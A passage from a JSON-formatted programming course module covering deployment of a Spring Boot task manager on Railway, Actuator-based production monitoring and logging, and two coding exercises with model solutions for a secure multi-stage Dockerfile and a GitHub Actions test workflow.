              "content": "Railway is a modern platform that makes deploying full-stack applications simple. Here is a step-by-step guide to deploying our Task Manager.\n\nStep 1: Create Railway Account\n- Go to https://railway.app\n- Sign up with GitHub (recommended for easy integration)\n\nStep 2: Create New Project\n```bash\n# Install Railway CLI\nnpm install -g @railway/cli\n\n# Login\nrailway login\n\n# Create new project\nrailway init\n```\n\nStep 3: Add PostgreSQL Database\n- In Railway dashboard, click \"+ New\"\n- Select \"Database\" then \"PostgreSQL\"\n- Railway automatically provisions the database\n- Copy the DATABASE_URL from the Variables tab\n\nStep 4: Configure Backend Service\n- Click \"+ New\" then \"GitHub Repo\"\n- Select your repository\n- Railway detects Dockerfile and builds automatically\n\nAdd environment variables in Railway dashboard:\n```\nDATABASE_URL=${{Postgres.DATABASE_URL}}\nJWT_SECRET=generate-a-secure-random-string\nJWT_EXPIRATION=86400000\nCORS_ALLOWED_ORIGINS=https://your-frontend.up.railway.app\n```\n\nStep 5: Configure railway.json (optional, for explicit config):\n```json\n{\n  \"$schema\": \"https://railway.app/railway.schema.json\",\n  \"build\": {\n    \"builder\": \"DOCKERFILE\",\n    \"dockerfilePath\": \"Dockerfile\"\n  },\n  \"deploy\": {\n    \"healthcheckPath\": \"/actuator/health\",\n    \"healthcheckTimeout\": 100,\n    \"restartPolicyType\": \"ON_FAILURE\",\n    \"restartPolicyMaxRetries\": 3\n  }\n}\n```\n\nStep 6: Deploy Frontend\n- Create another service in the same project\n- Point to frontend directory or separate repo\n- Add VITE_API_URL pointing to your backend URL\n\nStep 7: Set Up Custom Domain (Optional)\n- Go to Settings > Domains\n- Add your custom domain\n- Configure DNS with CNAME record pointing to Railway\n\nStep 8: Monitor Deployment\n```bash\n# View logs\nrailway logs\n\n# Check status\nrailway status\n\n# Redeploy\nrailway up\n```\n\nRailway Dashboard Features:\n- Real-time logs and metrics\n- Automatic SSL certificates\n- Environment variable management\n- Usage analytics and cost tracking\n- One-click rollbacks\n\nMonthly costs (as of 2024):\n- Hobby plan: $5/month with $5 credit (enough for small apps)\n- Pro plan: Pay for usage (starts around $20/month for active apps)"
            },
            {
              "type": "THEORY",
              "title": "Production Monitoring and Health Checks",
              "content": "Production applications need monitoring to detect and diagnose issues before users notice them.\n\nSpring Boot Actuator:\nActuator provides production-ready endpoints for monitoring and management.\n\n```gradle\nimplementation 'org.springframework.boot:spring-boot-starter-actuator'\n```\n\nConfigure actuator endpoints:\n```properties\n# application.properties\nmanagement.endpoints.web.exposure.include=health,info,metrics,prometheus\nmanagement.endpoint.health.show-details=when-authorized\nmanagement.health.db.enabled=true\nmanagement.health.diskspace.enabled=true\n\n# Info endpoint content\ninfo.app.name=Task Manager API\ninfo.app.version=@project.version@\ninfo.app.description=Full-stack task management application\n```\n\nCustom Health Indicators:\n```java\n@Component\npublic class DatabaseHealthIndicator implements HealthIndicator {\n\n    private final JdbcTemplate jdbcTemplate;\n\n    public DatabaseHealthIndicator(JdbcTemplate jdbcTemplate) {\n        this.jdbcTemplate = jdbcTemplate;\n    }\n\n    @Override\n    public Health health() {\n        try {\n            jdbcTemplate.queryForObject(\"SELECT 1\", Integer.class);\n            return Health.up()\n                .withDetail(\"database\", \"PostgreSQL\")\n                .withDetail(\"status\", \"Connected\")\n                .build();\n        } catch (Exception e) {\n            return Health.down()\n                .withDetail(\"error\", e.getMessage())\n                .build();\n        }\n    }\n}\n```\n\nStructured Logging:\n```java\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Service\npublic class TaskService {\n    private static final Logger log = LoggerFactory.getLogger(TaskService.class);\n\n    public TaskResponse createTask(TaskRequest request, User user) {\n        log.info(\"Creating task for user: {} with title: {}\", \n            user.getEmail(), request.getTitle());\n        \n        try {\n            Task task = // ... save task\n            log.info(\"Task created successfully: id={}\", task.getId());\n            return mapToResponse(task);\n        } catch (Exception e) {\n            log.error(\"Failed to create task for user: {}\", user.getEmail(), e);\n            throw e;\n        }\n    }\n}\n```\n\nJSON Logging for Production (logback-spring.xml):\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <springProfile name=\"prod\">\n        <appender name=\"JSON\" class=\"ch.qos.logback.core.ConsoleAppender\">\n            <encoder class=\"net.logstash.logback.encoder.LogstashEncoder\">\n                <includeMdcKeyName>userId</includeMdcKeyName>\n                <includeMdcKeyName>requestId</includeMdcKeyName>\n            </encoder>\n        </appender>\n        <root level=\"INFO\">\n            <appender-ref ref=\"JSON\"/>\n        </root>\n    </springProfile>\n</configuration>\n```\n\nRequest Tracing:\n```java\n@Component\npublic class RequestLoggingFilter extends OncePerRequestFilter {\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                    HttpServletResponse response,\n                                    FilterChain chain) throws ServletException, IOException {\n        String requestId = UUID.randomUUID().toString().substring(0, 8);\n        MDC.put(\"requestId\", requestId);\n        response.setHeader(\"X-Request-Id\", requestId);\n\n        long start = System.currentTimeMillis();\n        try {\n            chain.doFilter(request, response);\n        } finally {\n            long duration = System.currentTimeMillis() - start;\n            log.info(\"Request completed: {} {} - {} ({}ms)\",\n                request.getMethod(), request.getRequestURI(),\n                response.getStatus(), duration);\n            MDC.clear();\n        }\n    }\n}\n```\n\nMonitoring Checklist:\n- Health endpoint returns UP\n- Database connections healthy\n- Response times under 200ms (p95)\n- Error rate under 1%\n- Memory usage stable (no leaks)\n- Disk space adequate"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "capstone-16-9-dockerfile",
              "title": "Create a Production Dockerfile",
              "description": "Write a multi-stage Dockerfile for the Spring Boot application with security best practices.",
              "instructions": "Create a Dockerfile that:\n1. Uses Gradle 8.5 with JDK 21 for the build stage\n2. Uses Eclipse Temurin 21 JRE Alpine for the runtime\n3. Creates a non-root user called 'appuser'\n4. Includes a HEALTHCHECK instruction\n5. Exposes port 8080",
              "starterCode": "# Dockerfile\n# TODO: Create multi-stage Dockerfile",
              "solution": "# Stage 1: Build\nFROM gradle:8.5-jdk21 AS builder\n\nWORKDIR /app\n\n# Copy dependency files first for caching\nCOPY build.gradle settings.gradle ./\nCOPY gradle ./gradle\n\n# Download dependencies\nRUN gradle dependencies --no-daemon\n\n# Copy source and build\nCOPY src ./src\nRUN gradle build -x test --no-daemon\n\n# Stage 2: Runtime\nFROM eclipse-temurin:21-jre-alpine\n\nWORKDIR /app\n\n# Create non-root user\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\n\n# Copy JAR from builder\nCOPY --from=builder /app/build/libs/*.jar app.jar\n\n# Set ownership\nRUN chown appuser:appgroup app.jar\n\n# Switch to non-root user\nUSER appuser\n\n# Expose port\nEXPOSE 8080\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=40s --retries=3 \\\n  CMD wget --quiet --tries=1 --spider http://localhost:8080/actuator/health || exit 1\n\n# Run application\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]",
              "language": "dockerfile",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use 'AS builder' to name the first stage, then 'COPY --from=builder' to copy from it."
                },
                {
                  "level": 2,
                  "text": "On Alpine Linux, use addgroup -S and adduser -S for system users."
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-9-github-action",
              "title": "Create GitHub Actions Test Workflow",
              "description": "Create a GitHub Actions workflow that runs tests on pull requests.",
              "instructions": "Create a workflow that:\n1. Triggers on pull requests to main branch\n2. Sets up Java 21 with Gradle caching\n3. Runs a PostgreSQL service container\n4. Runs ./gradlew test\n5. Uploads test results as artifacts",
              "starterCode": "# .github/workflows/test.yml\n# TODO: Create GitHub Actions workflow",
              "solution": "name: Run Tests\n\non:\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    \n    services:\n      postgres:\n        image: postgres:15-alpine\n        env:\n          POSTGRES_DB: testdb\n          POSTGRES_USER: test\n          POSTGRES_PASSWORD: testpassword\n        ports:\n          - 5432:5432\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Set up JDK 21\n        uses: actions/setup-java@v4\n        with:\n          java-version: '21'\n          distribution: 'temurin'\n          cache: 'gradle'\n\n      - name: Grant execute permission for gradlew\n        run: chmod +x gradlew\n\n      - name: Run tests\n        env:\n          SPRING_DATASOURCE_URL: jdbc:postgresql://localhost:5432/testdb\n          SPRING_DATASOURCE_USERNAME: test\n          SPRING_DATASOURCE_PASSWORD: testpassword\n          JWT_SECRET: test-secret-key-for-ci-pipeline\n        run: ./gradlew test\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          name: test-results\n          path: build/reports/tests/test/\n          retention-days: 7",
              "language": "yaml",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use 'services' to define the PostgreSQL container. It runs alongside your job."
                },
                {
                  "level": 2,
                  "text": "Use 'if: always()' on the artifact upload to ensure results are uploaded even if tests fail."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ],
      "order": 16
    }
  ]
}